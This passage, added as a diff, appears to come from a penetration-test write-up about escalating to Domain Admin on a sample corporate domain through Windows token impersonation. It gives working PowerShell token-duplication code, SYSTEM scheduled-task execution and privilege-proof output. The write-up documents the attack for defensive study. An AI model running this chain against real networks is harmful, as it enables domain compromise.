@@ -1,0 +1,177 @@
+n.</p>
+<pre><code>$inner = @'
+$out = @()
+$out += &quot;=== CURRENT USER ===&quot;
+$out += whoami
+$out += &quot;&quot;
+$out += &quot;=== TOKEN GROUPS ===&quot;
+$out += whoami /groups
+$out += &quot;&quot;
+$out += &quot;=== DOMAIN USER DETAILS ===&quot;
+$out += net user admuser01 /domain
+$out += &quot;&quot;
+$out += &quot;=== DOMAIN ADMINS MEMBERS ===&quot;
+$out += net group &quot;Domain Admins&quot; /domain
+Set-Content C:\Users\Public\admuser01_da_proof.txt -Value $out -Encoding ASCII
+'@
+
+Set-Content C:\Users\Public\admuser01_inner.ps1 -Value $inner -Encoding ASCII
+</code></pre>
+<p>The script captured four pieces of evidence: the current user, token group membership, the domain account details for <code>ADMUSER01</code>, and the current Domain Admins group membership.</p>
+<figure class="article-figure">
+  <img id="token-path-img" alt="Domain Admin token impersonation path showing host control, session identification, token access, process creation and proof">
+  <figcaption>Domain Admin token impersonation path.</figcaption>
+</figure>
+
+<h2>How does Windows token impersonation enable Domain Admin privilege escalation?</h2>
+<p>A second script was prepared to run as <code>SYSTEM</code>.  This script used native Windows APIs to open the target process,  retrieve its token, duplicate the token, and create a new process using  that duplicated token.</p>
+<p>The workflow was as follows:</p>
+<p>The relevant API calls were loaded through PowerShell using <code>Add-Type</code>.</p>
+<pre><code>Start-Transcript C:\Windows\Temp\token_debug.txt -Force
+
+Add-Type @&quot;
+using System;
+using System.Runtime.InteropServices;
+
+public class Token {
+  [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]
+  public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
+
+  [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]
+  public static extern bool OpenProcessToken(IntPtr h, UInt32 acc, out IntPtr phtok);
+
+  [DllImport(&quot;advapi32.dll&quot;, SetLastError=true)]
+  public static extern bool DuplicateTokenEx(
+    IntPtr hExistingToken,
+    UInt32 dwDesiredAccess,
+    IntPtr lpTokenAttributes,
+    int ImpersonationLevel,
+    int TokenType,
+    out IntPtr phNewToken);
+
+  [DllImport(&quot;advapi32.dll&quot;, SetLastError=true, CharSet=CharSet.Unicode)]
+  public static extern bool CreateProcessAsUserW(
+    IntPtr hToken,
+    string app,
+    string cmd,
+    IntPtr procAttr,
+    IntPtr threadAttr,
+    bool inherit,
+    int flags,
+    IntPtr env,
+    string dir,
+    ref STARTUPINFO si,
+    out PROCESS_INFORMATION pi);
+}
+&quot;@
+</code></pre>
+<p>The target process ID was then set to the <code>ADMUSER01</code> process identified earlier.</p>
+<pre><code>$targetPid = 24680
+</code></pre>
+<p>The token handling sequence opened the process, opened the process token, and duplicated it.</p>
+<pre><code>$hProc = [Token]::OpenProcess(0x1000, $false, $targetPid)
+&quot;OpenProcess: $hProc Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())&quot;
+
+$hTok = [IntPtr]::Zero
+$r1 = [Token]::OpenProcessToken($hProc, 0xF01FF, [ref]$hTok)
+&quot;OpenProcessToken: $r1 Token: $hTok Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())&quot;
+
+$dupTok = [IntPtr]::Zero
+$r2 = [Token]::DuplicateTokenEx($hTok, 0xF01FF, [IntPtr]::Zero, 2, 1, [ref]$dupTok)
+&quot;DuplicateTokenEx: $r2 DupToken: $dupTok Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())&quot; A new PowerShell process was then created using the duplicated token. That process executed the proof script written earlier.
+</code></pre>
+<pre><code>$app = &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;
+$cmd = &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `&quot;iex ([System.IO.File]::ReadAllText('C:\Users\Public\admuser01_inner.ps1'))`&quot;&quot;
+
+$r3 = [Token]::CreateProcessAsUserW(
+  $dupTok,
+  $app,
+  $cmd,
+  [IntPtr]::Zero,
+  [IntPtr]::Zero,
+  $false,
+  0,
+  [IntPtr]::Zero,
+  &quot;C:\Users\Public&quot;,
+  [ref]$si,
+  [ref]$pi
+)
+
+&quot;CreateProcessAsUserW: $r3 PID: $($pi.dwProcessId) Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())&quot;
+
+Stop-Transcript
+</code></pre>
+<p>The token impersonation script was executed through an existing scheduled task configured to run as <code>SYSTEM</code>.</p>
+<pre><code>del C:\Users\Public\admuser01_da_proof.txt -ErrorAction SilentlyContinue
+del C:\Windows\Temp\token_debug.txt -ErrorAction SilentlyContinue
+
+Start-ScheduledTask -TaskName &quot;tokdebug3&quot;
+Start-Sleep 10
+
+type C:\Windows\Temp\token_debug.txt
+type C:\Users\Public\admuser01_da_proof.txt
+</code></pre>
+<h2>Token impersonation evidence</h2>
+<p>The transcript confirmed that the token impersonation script ran as <code>SYSTEM</code> on <code>SRV-MGMT-01</code>.</p>
+<pre><code>Windows PowerShell transcript start
+Username: EXAMPLE-CORP\SYSTEM
+RunAs User: EXAMPLE-CORP\SYSTEM
+Machine: SRV-MGMT-01 (Microsoft Windows NT 10.0.26100.0)
+Host Application: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command iex ([System.IO.File]::ReadAllText('C:\Windows\Temp\token_debug.ps1'))
+Process ID: 8642
+</code></pre>
+<p>The API results showed that the target process token was opened, duplicated, and used to create a new process.</p>
+<pre><code>OpenProcess: 9753 Error: 203
+OpenProcessToken: True Token: 2468 Error: 203
+DuplicateTokenEx: True DupToken: 3579 Error: 203
+CreateProcessAsUserW: True PID: 13579 Error: 0
+</code></pre>
+<p>The proof file then confirmed that the new process executed as the privileged domain user.</p>
+<pre><code>=== CURRENT USER ===
+example-corp\admuser01
+</code></pre>
+<p>The token group output showed that the process had inherited high-privilege domain group membership.</p>
+<pre><code>EXAMPLE-CORP\Domain Admins     Group S-1-5-21-1111111111-2222222222-3333333333-512 Mandatory group, Enabled by default, Enabled group
+EXAMPLE-CORP\Enterprise Admins Group S-1-5-21-1111111111-2222222222-3333333333-519 Mandatory group, Enabled by default, Enabled group
+EXAMPLE-CORP\Schema Admins     Group S-1-5-21-1111111111-2222222222-3333333333-518 Mandatory group, Enabled by default, Enabled group
+</code></pre>
+<p>The domain account details also confirmed that <code>ADMUSER01</code> was a privileged domain account.</p>
+<pre><code>=== DOMAIN USER DETAILS ===
+The request will be processed at a domain controller for domain example-corp.local.
+
+User name ADMUSER01
+Full Name Privileged User
+Account active Yes
+Account expires Never
+Last logon 28/04/2026 20:40:02
+
+Local Group Memberships *Administrators
+Global Group memberships *Enterprise Admins
+                         *Domain Admins
+                         *Schema Admins
+
+The command completed successfully.
+</code></pre>
+<p>Finally, the Domain Admins group output confirmed that <code>ADMUSER01</code> was directly listed as a Domain Admin member.</p>
+<pre><code>=== DOMAIN ADMINS MEMBERS ===
+The request will be processed at a domain controller for domain example-corp.local.
+
+Group name Domain Admins
+Comment Designated administrators of the domain
+
+Members
+-------------------------------------------------------------------------------
+ADMUSER02 SCCM_ADMIN01 SCCM_ADMIN02
+SCCM_ADMIN03 HELPDESK02 HELPDESK03
+HELPDESK04 helpdesk05 HELPDESK06
+ITADMIN01 ITADMIN02 ITADMIN03
+ITADMIN04 ITADMIN05 SCCM_ADMIN04
+ADMUSER01 DBADMIN01 SCCM_PUSH01
+svc.example.staff SCCM_ADMIN05
+
+The command completed successfully.
+</code></pre>
+<p>This demonstrated  execution under a Domain Admin user context through token impersonation.  The privileged user’s password was not required. The escalation relied  on local administrator access to a host where that privileged user had  an active session.</p>
+<pre><code></code></pre>
+<h2>Why did the attack chain succeed from low-privilege to Domain Admin?</h2>
+<p>The chain worked  because several controls failed or were not sufficiently enforced at  different points in the environment. AD CS web enrolment was exposed in a  way that allowed certificate issuance to be abused through NTLM relay.  The issu
